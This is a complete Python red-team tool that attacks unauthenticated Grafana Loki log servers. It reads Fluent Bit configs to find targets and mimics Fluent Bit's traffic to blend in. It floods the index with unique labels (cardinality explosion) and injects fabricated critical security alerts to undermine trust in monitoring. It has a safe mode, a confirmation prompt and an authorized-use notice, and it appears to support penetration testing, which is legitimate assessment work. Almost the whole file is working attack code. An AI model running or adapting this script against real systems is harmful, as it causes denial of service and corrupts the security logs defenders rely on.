#!/usr/bin/env python3
"""
================================================================================
LOKI CARDINALITY EXPLOSION - RED TEAM PROOF OF CONCEPT
================================================================================

Target: Unauthenticated Grafana Loki Instance
Attack: Cardinality Explosion via Label Flooding
Vector: Compromised trusted log forwarder endpoint

This script demonstrates the risk of running Loki without application-layer
authentication, relying solely on network firewalls for security.

LEGAL NOTICE: For authorized penetration testing only. Unauthorized use is illegal.

Author: Red Team Assessment
Date: 2025-11-28
================================================================================
"""

import argparse
import configparser
import gzip
import json
import logging
import os
import random
import re
import string
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from io import StringIO

try:
    import requests
except ImportError:
    print("[!] 'requests' library not found. Install with: pip install requests")
    sys.exit(1)

# ==============================================================================
# CONFIGURATION
# ==============================================================================

@dataclass
class LokiTarget:
    """Represents a discovered Loki endpoint from Fluent Bit config."""
    host: str
    port: int
    path: str
    labels: Dict[str, str]
    tenant_id: Optional[str] = None

@dataclass
class AttackConfig:
    """Attack configuration parameters."""
    target: LokiTarget
    mode: str  # 'safe', 'cardinality', 'integrity', 'full'
    num_entries: int
    threads: int
    delay_ms: int
    unique_labels_per_batch: int
    batch_size: int

# ==============================================================================
# FLUENT BIT CONFIG PARSER
# ==============================================================================

class FluentBitConfigParser:
    """
    Parses Fluent Bit configuration files to extract Loki destination details.
    This ensures our attack traffic mimics legitimate log forwarding.
    """
    
    def __init__(self, config_path: str):
        self.config_path = Path(config_path)
        self.base_dir = self.config_path.parent
        self.loki_outputs: List[LokiTarget] = []
        
    def parse(self) -> List[LokiTarget]:
        """Parse the main config and all included files."""
        logging.info(f"[*] Parsing Fluent Bit config: {self.config_path}")
        
        if not self.config_path.exists():
            raise FileNotFoundError(f"Config not found: {self.config_path}")
        
        self._parse_file(self.config_path)
        return self.loki_outputs
    
    def _parse_file(self, filepath: Path):
        """Parse a single config file, handling @INCLUDE directives."""
        content = filepath.read_text()
        
        # Handle @INCLUDE directives (glob patterns)
        include_pattern = re.compile(r'@INCLUDE\s+(.+)', re.IGNORECASE)
        for match in include_pattern.finditer(content):
            include_path = match.group(1).strip()
            
            # Resolve relative paths
            if not os.path.isabs(include_path):
                include_path = self.base_dir / include_path
            
            # Handle glob patterns
            if '*' in str(include_path):
                import glob
                for included_file in glob.glob(str(include_path)):
                    self._parse_file(Path(included_file))
            elif Path(include_path).exists():
                self._parse_file(Path(include_path))
        
        # Extract OUTPUT blocks for Loki
        self._extract_loki_outputs(content)
    
    def _extract_loki_outputs(self, content: str):
        """Extract Loki OUTPUT configurations."""
        # Match [OUTPUT] blocks
        output_pattern = re.compile(
            r'\[OUTPUT\](.*?)(?=\[(?:INPUT|OUTPUT|FILTER|SERVICE)\]|\Z)',
            re.DOTALL | re.IGNORECASE
        )
        
        for match in output_pattern.finditer(content):
            block = match.group(1)
            
            # Check if this is a Loki output
            if not re.search(r'Name\s+loki', block, re.IGNORECASE):
                continue
            
            # Extract configuration values
            host = self._extract_value(block, 'Host') or 'localhost'
            port = int(self._extract_value(block, 'Port') or '3100')
            path = self._extract_value(block, 'Uri') or '/loki/api/v1/push'
            tenant_id = self._extract_value(block, 'Tenant_ID')
            
            # Extract labels
            labels = {}
            label_matches = re.findall(r'Labels\s+(.+)', block, re.IGNORECASE)
            for label_str in label_matches:
                # Parse label format: key1=value1, key2=value2
                for pair in label_str.split(','):
                    if '=' in pair:
                        k, v = pair.strip().split('=', 1)
                        labels[k.strip()] = v.strip()
            
            # Also check for label_keys
            label_keys = self._extract_value(block, 'label_keys')
            if label_keys:
                for key in label_keys.split(','):
                    labels[key.strip()] = '$' + key.strip()  # Dynamic label
            
            self.loki_outputs.append(LokiTarget(
                host=host,
                port=port,
                path=path,
                labels=labels,
                tenant_id=tenant_id
            ))
            
            logging.info(f"    [+] Found Loki output: {host}:{port}{path}")
            logging.info(f"        Labels: {labels}")
    
    def _extract_value(self, block: str, key: str) -> Optional[str]:
        """Extract a configuration value from a block."""
        pattern = re.compile(rf'{key}\s+(.+)', re.IGNORECASE)
        match = pattern.search(block)
        return match.group(1).strip() if match else None


# ==============================================================================
# LOKI API CLIENT (Mimics Fluent Bit)
# ==============================================================================

class LokiAttackClient:
    """
    HTTP client that mimics Fluent Bit's Loki output plugin.
    Headers and payload format match legitimate traffic exactly.
    """
    
    # Fluent Bit's actual User-Agent format
    FLUENT_BIT_USER_AGENT = "Fluent-Bit"
    
    def __init__(self, target: LokiTarget, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.base_url = f"http://{target.host}:{target.port}"
        self.push_url = f"{self.base_url}{target.path}"
        self.session = requests.Session()
        
        # Set headers to exactly match Fluent Bit
        self.session.headers.update({
            'User-Agent': self.FLUENT_BIT_USER_AGENT,
            'Content-Type': 'application/json',
        })
        
        # Add tenant header if configured
        if target.tenant_id:
            self.session.headers['X-Scope-OrgID'] = target.tenant_id
    
    def verify_connectivity(self) -> Tuple[bool, str]:
        """
        Verify we can reach the Loki API.
        Uses the /ready endpoint first, then attempts a minimal push.
        """
        logging.info(f"[*] Verifying connectivity to {self.base_url}")
        
        # Check /ready endpoint
        try:
            resp = self.session.get(
                f"{self.base_url}/ready",
                timeout=self.timeout
            )
            if resp.status_code == 200:
                logging.info("    [+] Loki /ready endpoint: OK")
            else:
                logging.warning(f"    [!] Loki /ready returned: {resp.status_code}")
        except requests.RequestException as e:
            return False, f"Cannot reach Loki /ready: {e}"
        
        # Attempt minimal push (handshake)
        try:
            test_payload = self._build_payload(
                labels={"job": "connectivity_test", "source": "pentest"},
                entries=[{
                    "ts": self._get_timestamp_ns(),
                    "line": "Connectivity verification - Red Team Assessment"
                }]
            )
            
            resp = self.session.post(
                self.push_url,
                data=json.dumps(test_payload),
                timeout=self.timeout
            )
            
            if resp.status_code in (200, 204):
                logging.info("    [+] Push API accessible: CONFIRMED")
                logging.info("    [!] VULNERABILITY: No authentication required!")
                return True, "Unauthenticated access confirmed"
            else:
                return False, f"Push rejected with status {resp.status_code}: {resp.text}"
                
        except requests.RequestException as e:
            return False, f"Push failed: {e}"
    
    def push_logs(self, labels: Dict[str, str], entries: List[Dict]) -> bool:
        """Push log entries to Loki with given labels."""
        payload = self._build_payload(labels, entries)
        
        try:
            resp = self.session.post(
                self.push_url,
                data=json.dumps(payload),
                timeout=self.timeout
            )
            return resp.status_code in (200, 204)
        except requests.RequestException:
            return False
    
    def _build_payload(self, labels: Dict[str, str], entries: List[Dict]) -> Dict:
        """
        Build Loki push API payload.
        Format matches Fluent Bit's output exactly.
        """
        # Convert labels dict to Prometheus format: {key="value", key2="value2"}
        label_str = '{' + ', '.join(f'{k}="{v}"' for k, v in labels.items()) + '}'
        
        return {
            "streams": [{
                "stream": labels,
                "values": [
                    [entry["ts"], entry["line"]] for entry in entries
                ]
            }]
        }
    
    def _get_timestamp_ns(self) -> str:
        """Get current timestamp in nanoseconds (Loki format)."""
        return str(int(time.time() * 1e9))


# ==============================================================================
# ATTACK PAYLOADS
# ==============================================================================

class AttackPayloadGenerator:
    """Generates various attack payloads for different attack modes."""
    
    # Fake security events for integrity attacks
    FAKE_SECURITY_EVENTS = [
        'level=critical msg="Root login successful" user=root src_ip={ip} method=ssh',
        'level=alert msg="Firewall rule disabled" rule_id=DROP_ALL admin={user}',
        'level=critical msg="Database dump initiated" db=users destination={ip}',
        'level=alert msg="Privilege escalation detected" user={user} new_group=wheel',
        'level=critical msg="SSH key added to authorized_keys" user=root key_fingerprint={hash}',
        'level=alert msg="Audit logging disabled" action=stop service=auditd by={user}',
        'level=critical msg="Shadow file accessed" process={proc} user={user}',
        'level=alert msg="Outbound connection to C2" dst_ip={ip} dst_port=4444',
        'level=critical msg="Crontab modified" user=root job="* * * * * /tmp/.x"',
        'level=alert msg="Kernel module loaded" module=rootkit_{hash} user=root',
    ]
    
    # Normal-looking log messages
    NORMAL_LOG_TEMPLATES = [
        'level=info msg="Request processed" method=GET path=/{path} status=200 duration={dur}ms',
        'level=debug msg="Cache hit" key={key} ttl={ttl}s',
        'level=info msg="Connection established" remote_addr={ip} protocol=tcp',
        'level=warn msg="High memory usage" percent={pct} threshold=80',
        'level=info msg="Health check passed" service={svc} latency={dur}ms',
    ]
    
    @staticmethod
    def generate_unique_id() -> str:
        """Generate a unique identifier for cardinality explosion."""
        return str(uuid.uuid4())
    
    @staticmethod
    def generate_random_ip() -> str:
        """Generate a random IP address."""
        return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    @staticmethod
    def generate_random_hash() -> str:
        """Generate a random hash-like string."""
        return ''.join(random.choices(string.hexdigits.lower(), k=32))
    
    @classmethod
    def generate_cardinality_labels(cls, base_labels: Dict[str, str]) -> Dict[str, str]:
        """
        Generate labels with unique values to explode cardinality.
        Each call creates a completely new stream in Loki's index.
        """
        attack_labels = base_labels.copy()
        
        # Add unique labels that will create new index entries
        attack_labels.update({
            'request_id': cls.generate_unique_id(),
            'trace_id': cls.generate_unique_id(),
            'span_id': cls.generate_unique_id()[:16],
            'instance': f"host-{cls.generate_random_hash()[:8]}",
            'pod': f"pod-{cls.generate_random_hash()[:12]}",
        })
        
        return attack_labels
    
    @classmethod
    def generate_fake_security_log(cls) -> str:
        """Generate a fake security alert log entry."""
        template = random.choice(cls.FAKE_SECURITY_EVENTS)
        return template.format(
            ip=cls.generate_random_ip(),
            user=random.choice(['admin', 'root', 'operator', 'backup']),
            hash=cls.generate_random_hash()[:16],
            proc=random.choice(['sshd', 'bash', 'python3', 'perl'])
        )
    
    @classmethod
    def generate_normal_log(cls) -> str:
        """Generate a normal-looking log entry."""
        template = random.choice(cls.NORMAL_LOG_TEMPLATES)
        return template.format(
            path=random.choice(['api/v1/users', 'health', 'metrics', 'status']),
            dur=random.randint(1, 500),
            key=f"cache:{cls.generate_random_hash()[:8]}",
            ttl=random.randint(60, 3600),
            ip=cls.generate_random_ip(),
            pct=random.randint(70, 95),
            svc=random.choice(['nginx', 'postgres', 'redis', 'app'])
        )


# ==============================================================================
# ATTACK EXECUTOR
# ==============================================================================

class LokiAttackExecutor:
    """
    Executes the cardinality explosion attack against Loki.
    """
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.client = LokiAttackClient(config.target)
        self.stats = {
            'entries_sent': 0,
            'streams_created': 0,
            'requests_success': 0,
            'requests_failed': 0,
            'start_time': None,
            'end_time': None
        }
    
    def run(self) -> Dict:
        """Execute the attack based on configured mode."""
        logging.info(f"\n[*] Starting attack in '{self.config.mode}' mode")
        logging.info(f"    Target: {self.config.target.host}:{self.config.target.port}")
        logging.info(f"    Entries: {self.config.num_entries}")
        logging.info(f"    Threads: {self.config.threads}")
        
        # Verify connectivity first
        success, message = self.client.verify_connectivity()
        if not success:
            logging.error(f"[!] Connectivity check failed: {message}")
            return self.stats
        
        self.stats['start_time'] = time.time()
        
        if self.config.mode == 'safe':
            self._run_safe_mode()
        elif self.config.mode == 'cardinality':
            self._run_cardinality_attack()
        elif self.config.mode == 'integrity':
            self._run_integrity_attack()
        elif self.config.mode == 'full':
            self._run_full_attack()
        
        self.stats['end_time'] = time.time()
        self._print_stats()
        return self.stats
    
    def _run_safe_mode(self):
        """Safe mode: Send minimal entries to prove access without damage."""
        logging.info("\n[*] SAFE MODE: Sending 5 proof-of-concept entries only")
        
        base_labels = {
            'job': 'redteam_poc',
            'source': 'authorized_pentest',
            'mode': 'safe'
        }
        
        entries = []
        timestamp = int(time.time() * 1e9)
        
        for i in range(5):
            entries.append({
                'ts': str(timestamp + i * 1000000),  # 1ms apart
                'line': f'[PENTEST] Safe mode entry {i+1}/5 - Access verification successful'
            })
        
        if self.client.push_logs(base_labels, entries):
            self.stats['entries_sent'] = 5
            self.stats['streams_created'] = 1
            self.stats['requests_success'] = 1
            logging.info("    [+] Proof of concept successful - 5 entries injected")
            logging.info("    [+] Check Loki with: {job=\"redteam_poc\"}")
        else:
            self.stats['requests_failed'] = 1
            logging.error("    [!] Failed to inject proof-of-concept entries")
    
    def _run_cardinality_attack(self):
        """
        Cardinality Explosion: Create maximum unique streams.
        Each batch creates new label combinations to bloat the index.
        """
        logging.info("\n[!] CARDINALITY EXPLOSION MODE")
        logging.info("    Creating unique streams to bloat Loki index...")
        
        base_labels = {
            'job': 'application',
            'env': 'production',
        }
        
        batches = self.config.num_entries // self.config.batch_size
        remaining = self.config.num_entries % self.config.batch_size
        
        def send_batch(batch_id: int, size: int):
            """Send a batch of entries with unique labels."""
            successes = 0
            streams = 0
            
            for _ in range(self.config.unique_labels_per_batch):
                # Each iteration creates a NEW stream (unique labels)
                attack_labels = AttackPayloadGenerator.generate_cardinality_labels(base_labels)
                
                entries = []
                timestamp = int(time.time() * 1e9)
                entries_per_stream = size // self.config.unique_labels_per_batch
                
                for i in range(entries_per_stream):
                    entries.append({
                        'ts': str(timestamp + i * 1000),
                        'line': AttackPayloadGenerator.generate_normal_log()
                    })
                
                if self.client.push_logs(attack_labels, entries):
                    successes += len(entries)
                    streams += 1
                
                # Rate limiting
                if self.config.delay_ms > 0:
                    time.sleep(self.config.delay_ms / 1000)
            
            return successes, streams
        
        # Execute batches in parallel
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            for i in range(batches):
                futures.append(executor.submit(send_batch, i, self.config.batch_size))
            if remaining > 0:
                futures.append(executor.submit(send_batch, batches, remaining))
            
            for future in as_completed(futures):
                try:
                    successes, streams = future.result()
                    self.stats['entries_sent'] += successes
                    self.stats['streams_created'] += streams
                    self.stats['requests_success'] += 1
                except Exception as e:
                    self.stats['requests_failed'] += 1
                    logging.debug(f"Batch failed: {e}")
    
    def _run_integrity_attack(self):
        """
        Data Integrity Attack: Inject fake security alerts.
        Designed to trigger false alarms and undermine trust in SIEM.
        """
        logging.info("\n[!] DATA INTEGRITY ATTACK MODE")
        logging.info("    Injecting fake security alerts...")
        
        # Labels that make these look like real security events
        security_labels = {
            'job': 'security_audit',
            'source': 'sshd',
            'level': 'critical',
            'host': 'prod-server-01'
        }
        
        entries = []
        timestamp = int(time.time() * 1e9)
        
        for i in range(self.config.num_entries):
            entries.append({
                'ts': str(timestamp + i * 1000000000),  # 1 second apart
                'line': AttackPayloadGenerator.generate_fake_security_log()
            })
            
            # Send in batches
            if len(entries) >= self.config.batch_size:
                if self.client.push_logs(security_labels, entries):
                    self.stats['entries_sent'] += len(entries)
                    self.stats['requests_success'] += 1
                else:
                    self.stats['requests_failed'] += 1
                entries = []
                
                if self.config.delay_ms > 0:
                    time.sleep(self.config.delay_ms / 1000)
        
        # Send remaining
        if entries:
            if self.client.push_logs(security_labels, entries):
                self.stats['entries_sent'] += len(entries)
                self.stats['requests_success'] += 1
        
        self.stats['streams_created'] = 1
        logging.info(f"    [+] Injected {self.stats['entries_sent']} fake security alerts")
    
    def _run_full_attack(self):
        """Combined attack: Cardinality explosion + Integrity attack."""
        logging.info("\n[!] FULL ATTACK MODE: Cardinality + Integrity")
        
        # Split entries between attack types
        cardinality_entries = self.config.num_entries * 2 // 3
        integrity_entries = self.config.num_entries // 3
        
        # Temporarily adjust config
        original_entries = self.config.num_entries
        
        self.config.num_entries = cardinality_entries
        self._run_cardinality_attack()
        
        self.config.num_entries = integrity_entries
        self._run_integrity_attack()
        
        self.config.num_entries = original_entries
    
    def _print_stats(self):
        """Print attack statistics."""
        duration = self.stats['end_time'] - self.stats['start_time']
        rate = self.stats['entries_sent'] / duration if duration > 0 else 0
        
        logging.info("\n" + "=" * 60)
        logging.info("ATTACK STATISTICS")
        logging.info("=" * 60)
        logging.info(f"  Duration:         {duration:.2f} seconds")
        logging.info(f"  Entries Sent:     {self.stats['entries_sent']}")
        logging.info(f"  Streams Created:  {self.stats['streams_created']}")
        logging.info(f"  Requests OK:      {self.stats['requests_success']}")
        logging.info(f"  Requests Failed:  {self.stats['requests_failed']}")
        logging.info(f"  Rate:             {rate:.2f} entries/second")
        logging.info("=" * 60)


# ==============================================================================
# MAIN ENTRY POINT
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='Loki Cardinality Explosion PoC - Red Team Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ATTACK MODES:
  safe        - Send 5 entries only (prove access, no damage)
  cardinality - Explode index with unique label combinations
  integrity   - Inject fake security alerts
  full        - Combined cardinality + integrity attack

EXAMPLES:
  # Safe mode (default) - verify access
  python3 %(prog)s -c /etc/fluent-bit/fluent-bit.conf
  
  # Cardinality attack - 10000 unique streams
  python3 %(prog)s -c /etc/fluent-bit/fluent-bit.conf -m cardinality -n 10000
  
  # Manual target specification
  python3 %(prog)s --host 10.10.30.2 --port 3100 -m safe
        """
    )
    
    # Target specification
    target_group = parser.add_argument_group('Target Specification')
    target_group.add_argument(
        '-c', '--config',
        help='Path to fluent-bit.conf to auto-extract Loki target'
    )
    target_group.add_argument(
        '--host',
        help='Loki host (if not using config file)'
    )
    target_group.add_argument(
        '--port',
        type=int,
        default=3100,
        help='Loki port (default: 3100)'
    )
    
    # Attack configuration
    attack_group = parser.add_argument_group('Attack Configuration')
    attack_group.add_argument(
        '-m', '--mode',
        choices=['safe', 'cardinality', 'integrity', 'full'],
        default='safe',
        help='Attack mode (default: safe)'
    )
    attack_group.add_argument(
        '-n', '--num-entries',
        type=int,
        default=5,
        help='Number of log entries to generate (default: 5)'
    )
    attack_group.add_argument(
        '-t', '--threads',
        type=int,
        default=4,
        help='Number of parallel threads (default: 4)'
    )
    attack_group.add_argument(
        '-d', '--delay',
        type=int,
        default=0,
        help='Delay between requests in milliseconds (default: 0)'
    )
    attack_group.add_argument(
        '-b', '--batch-size',
        type=int,
        default=100,
        help='Entries per batch (default: 100)'
    )
    attack_group.add_argument(
        '-u', '--unique-per-batch',
        type=int,
        default=10,
        help='Unique label sets per batch for cardinality attack (default: 10)'
    )
    
    # Output
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )
    
    args = parser.parse_args()
    
    # Configure logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(message)s'
    )
    
    # Banner
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║        LOKI CARDINALITY EXPLOSION - RED TEAM PoC              ║
    ║                                                               ║
    ║  [!] For authorized penetration testing only                  ║
    ║  [!] Unauthorized use is illegal                              ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    # Determine target
    target = None
    
    if args.config:
        # Parse Fluent Bit config to extract target
        try:
            parser_fb = FluentBitConfigParser(args.config)
            targets = parser_fb.parse()
            
            if targets:
                target = targets[0]  # Use first Loki output found
                logging.info(f"[+] Using target from config: {target.host}:{target.port}")
            else:
                logging.error("[!] No Loki outputs found in config")
                sys.exit(1)
        except Exception as e:
            logging.error(f"[!] Failed to parse config: {e}")
            sys.exit(1)
    
    elif args.host:
        # Manual target specification
        target = LokiTarget(
            host=args.host,
            port=args.port,
            path='/loki/api/v1/push',
            labels={'job': 'pentest'}
        )
    else:
        parser.error("Either --config or --host must be specified")
    
    # Safety check for destructive modes
    if args.mode != 'safe':
        logging.warning("\n" + "!" * 60)
        logging.warning("  WARNING: You are about to run a DESTRUCTIVE attack!")
        logging.warning(f"  Mode: {args.mode}")
        logging.warning(f"  Entries: {args.num_entries}")
        logging.warning("!" * 60)
        
        confirm = input("\nType 'CONFIRM' to proceed: ")
        if confirm != 'CONFIRM':
            logging.info("[*] Attack cancelled by user")
            sys.exit(0)
    
    # Build attack config
    attack_config = AttackConfig(
        target=target,
        mode=args.mode,
        num_entries=args.num_entries,
        threads=args.threads,
        delay_ms=args.delay,
        unique_labels_per_batch=args.unique_per_batch,
        batch_size=args.batch_size
    )
    
    # Execute attack
    executor = LokiAttackExecutor(attack_config)
    stats = executor.run()
    
    # Exit code based on success
    if stats['requests_success'] > 0:
        logging.info("\n[+] Attack completed successfully")
        logging.info("[*] Recommendation: Implement auth_enabled: true in Loki config")
        sys.exit(0)
    else:
        logging.error("\n[!] Attack failed - no successful requests")
        sys.exit(1)


if __name__ == '__main__':
    main()
